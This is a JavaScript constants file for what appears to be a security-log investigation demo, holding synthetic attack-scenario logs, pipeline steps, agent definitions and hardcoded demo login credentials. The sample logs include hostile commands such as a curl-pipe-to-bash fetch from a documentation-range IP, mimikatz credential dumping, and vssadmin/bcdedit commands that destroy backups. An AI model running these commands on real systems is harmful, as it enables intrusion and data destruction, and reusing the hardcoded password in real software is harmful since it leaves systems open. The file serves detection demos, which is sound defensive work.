// src/constants/scenarios.js

export const SCENARIOS = {
  bruteforce: {
    name: 'SSH Brute Force',
    severity: 'CRITICAL',
    mitre: 'T1110',
    logs: `2024-01-15 03:22:11 sshd[1234]: Failed password for admin from 185.220.101.5 port 52341 ssh2
2024-01-15 03:22:13 sshd[1234]: Failed password for root from 185.220.101.5 port 52342 ssh2
2024-01-15 03:22:15 sshd[1234]: Failed password for admin from 185.220.101.5 port 52343 ssh2
2024-01-15 03:22:16 sshd[1234]: Failed password for admin from 185.220.101.5 port 52344 ssh2
2024-01-15 03:22:17 sshd[1234]: Failed password for ubuntu from 185.220.101.5 port 52345 ssh2
2024-01-15 03:22:18 sshd[1234]: Failed password for admin from 185.220.101.5 port 52346 ssh2
2024-01-15 03:22:19 sshd[1234]: Failed password for root from 185.220.101.5 port 52347 ssh2
2024-01-15 03:22:21 sshd[1234]: Accepted password for admin from 185.220.101.5 port 52348 ssh2
2024-01-15 03:22:22 sshd[1235]: session opened for user admin by (uid=0)
2024-01-15 03:22:30 sudo[1236]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/whoami
2024-01-15 03:22:35 sudo[1237]: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash`,
  },
  lateral: {
    name: 'Lateral Movement',
    severity: 'CRITICAL',
    mitre: 'T1021',
    logs: `2024-01-15 09:15:01 WIN-DC01 Security: Logon Type 3 Account Name: svc_backup Domain: CORP Source IP: 192.168.1.45
2024-01-15 09:15:02 WIN-DC01 Security: Special privileges assigned to new logon Account Name: svc_backup
2024-01-15 09:15:10 WIN-SRV02 Security: Logon Type 3 Account Name: svc_backup Source IP: 192.168.1.45
2024-01-15 09:15:15 WIN-SRV02 Security: Object Access File Share \\WIN-SRV02\ADMIN$ Access Mask: 0x1
2024-01-15 09:15:20 WIN-SRV03 Security: Logon Type 3 Account Name: svc_backup Source IP: 192.168.1.45
2024-01-15 09:15:25 WIN-SRV03 Process Create: cmd.exe /c net user administrator Pass@123! /domain
2024-01-15 09:15:30 WIN-SRV03 Process Create: mimikatz.exe privilege::debug sekurlsa::logonpasswords
2024-01-15 09:15:45 WIN-SRV03 Network: Outbound connection to 10.0.0.99:445 from svc_backup`,
  },
  exfil: {
    name: 'Data Exfiltration',
    severity: 'HIGH',
    mitre: 'T1041',
    logs: `2024-01-15 14:30:01 fileserver audit: user jsmith accessed /confidential/financial_data.xlsx (read)
2024-01-15 14:30:15 fileserver audit: user jsmith accessed /confidential/employee_records.csv (read)
2024-01-15 14:30:45 fileserver audit: user jsmith accessed /confidential/product_roadmap.pdf (read)
2024-01-15 14:31:00 fileserver audit: user jsmith created /tmp/archive.zip size=45MB
2024-01-15 14:31:30 firewall: OUTBOUND TCP 192.168.1.102 -> 91.198.174.192:443 bytes=47123456
2024-01-15 14:31:35 firewall: OUTBOUND TCP 192.168.1.102 -> 91.198.174.192:443 bytes=12456789
2024-01-15 14:32:00 dns: query mega.nz from 192.168.1.102
2024-01-15 14:32:10 proxy: CONNECT mega.nz:443 from jsmith@192.168.1.102 bytes_sent=58MB`,
  },
  ransomware: {
    name: 'Ransomware Deploy',
    severity: 'CRITICAL',
    mitre: 'T1486',
    logs: `2024-01-15 02:00:01 WIN-SRV01 Process: powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAY3Q=
2024-01-15 02:00:05 WIN-SRV01 Registry: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options modified
2024-01-15 02:00:10 WIN-SRV01 Process: vssadmin.exe delete shadows /all /quiet
2024-01-15 02:00:12 WIN-SRV01 Process: wbadmin.exe delete catalog -quiet
2024-01-15 02:00:15 WIN-SRV01 Process: bcdedit.exe /set {default} recoveryenabled No
2024-01-15 02:00:20 WIN-SRV01 File: C:\Users\Public\README_DECRYPT.txt created
2024-01-15 02:00:25 WIN-SRV01 File: Multiple .encrypted extension files created in C:\Users\
2024-01-15 02:00:30 firewall: OUTBOUND TCP 192.168.1.50 -> 185.220.101.47:80 bytes=1024
2024-01-15 02:00:31 WIN-SRV01 Process: net.exe use \\192.168.1.55\C$ /user:admin Pass@123`,
  },
  apt: {
    name: 'APT Lateral + C2',
    severity: 'CRITICAL',
    mitre: 'T1071',
    logs: `2024-03-10 11:00:01 fw-01 RECON: port scan from 203.0.113.42 to 10.0.1.0/24 (nmap fingerprint)
2024-03-10 11:02:15 web-srv-01 access: GET /api/v1/admin?debug=1 from 203.0.113.42 HTTP/1.1 200
2024-03-10 11:05:30 web-srv-01 exec: sh -c 'curl http://203.0.113.42/backdoor.sh | bash'
2024-03-10 11:05:45 web-srv-01 process: python3 -c "import socket,subprocess,os; ... reverse shell"
2024-03-10 11:10:00 web-srv-01 network: OUTBOUND beacon 203.0.113.42:4444 every 60s (C2)
2024-03-10 11:15:20 db-srv-01 security: Logon Type 3 from web-srv-01 (lateral via stolen token)
2024-03-10 11:20:00 db-srv-01 process: mysqldump --all-databases > /tmp/.hidden/dump.sql
2024-03-10 11:25:10 fw-01 OUTBOUND: 10.0.1.10 -> 203.0.113.42:443 bytes=384MB (exfil)`,
  },
  insider: {
    name: 'Insider Threat',
    severity: 'HIGH',
    mitre: 'T1078',
    logs: `2024-05-20 22:15:00 vpn-gw: Unusual after-hours VPN login for user m.chen from 198.51.100.77 (TOR exit)
2024-05-20 22:16:30 file-srv: m.chen accessed /HR/salary_data_2024.xlsx (read) — outside business hours
2024-05-20 22:17:00 file-srv: m.chen accessed /FINANCE/Q4_projections.xlsx (read)
2024-05-20 22:18:45 file-srv: m.chen accessed /IP/product_blueprints.zip (download) 450MB
2024-05-20 22:20:00 dlp: m.chen — USB device inserted, 2.1GB written in 3 minutes
2024-05-20 22:21:10 email-gw: m.chen sent 5 emails to gmail.com with attachments totaling 120MB
2024-05-20 22:25:00 audit: m.chen deleted browser history and cleared Windows event logs
2024-05-20 22:26:00 vpn-gw: m.chen disconnected. Total session: 11 minutes, 2.6GB transferred`,
  },
};

// In production (Vercel), set VITE_API_BASE to your deployed backend URL.
// Locally it falls back to http://localhost:8000
export const API_BASE = import.meta.env.VITE_API_BASE || 'http://localhost:8000';

export const DEMO_CREDENTIALS = {
  username: 'analyst',
  password: 'password123',
};

export const SEVERITY_COLORS = {
  CRITICAL: '#ff4444',
  HIGH: '#ff9800',
  MEDIUM: '#ffd740',
  LOW: '#00e676',
  INFO: '#4488ff',
};

export const PIPELINE_STEPS = [
  { id: 0, label: 'Log Normalization',        desc: 'Regex + JSON parser',        icon: '🗂' },
  { id: 1, label: 'Event Extraction',          desc: 'Rule-based (10 types)',       icon: '🔍' },
  { id: 2, label: 'LSTM Anomaly Detection',    desc: 'Sequence autoencoder',        icon: '🧠' },
  { id: 3, label: 'Threat Intel Lookup',       desc: 'IP/hash/command DB',          icon: '🔎' },
  { id: 4, label: 'MITRE ATT&CK RAG',          desc: 'ChromaDB semantic search',    icon: '📚' },
  { id: 5, label: 'LLM Investigation',         desc: 'GPT-OSS 120B via OpenRouter',       icon: '🤖' },
  { id: 6, label: 'Attack Graph Build',        desc: 'NetworkX kill-chain',         icon: '🕸' },
  { id: 7, label: 'Agent Correlation',         desc: 'ReAct cross-session',         icon: '⚡' },
];

export const AGENTS = [
  { id: 1, name: 'AnomalyScoreAgent', role: 'LSTM behavioral scoring',         weight: 35, color: '#ff4444', phase: 'ACT' },
  { id: 2, name: 'RAGLookupAgent',    role: 'MITRE ATT&CK semantic retrieval', weight: 20, color: '#4488ff', phase: 'ACT' },
  { id: 3, name: 'ThreatIntelAgent',  role: 'IP/hash/command reputation',      weight: 10, color: '#ff9800', phase: 'ACT' },
  { id: 4, name: 'PatternMatchAgent', role: '8 heuristic attack patterns',     weight: 10, color: '#ffd740', phase: 'ACT' },
  { id: 5, name: 'IOCExtractorAgent', role: 'Automated indicator parsing',     weight: 10, color: '#00e676', phase: 'ACT' },
  { id: 6, name: 'PlaybookAgent',     role: 'Severity-adaptive response gen',  weight: 15, color: '#aa66ff', phase: 'EXPLAIN' },
];
